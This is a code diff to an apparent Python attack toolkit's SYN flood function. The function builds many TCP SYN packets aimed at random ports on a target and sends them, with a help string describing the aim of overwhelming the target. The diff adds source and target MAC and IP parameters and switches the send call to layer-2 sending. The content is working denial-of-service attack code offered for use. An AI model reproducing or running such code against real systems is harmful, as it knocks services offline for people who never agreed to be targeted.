@@ -6,7 +6,7 @@ function_name = "syn_flood"
 
 def syn_flood(values):
     print("SYN Flood")
-    valid_var = ["quantity"]
+    valid_var = ["source_mac_address", "target_mac_address", "target_ip", "quantity"]
     help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
     print("\nRunning SYN Flood attack, please enter the parameters:\n")
     variable_input(valid_var, help_statement, values)
@@ -19,5 +19,5 @@ def syn_flood(values):
         ns.extend(template)
         ns[pktNum][TCP].dport = random.choice(ports)
     print(ns)
-    send(ns)
+    sendp(ns)
     print("Packets sent")
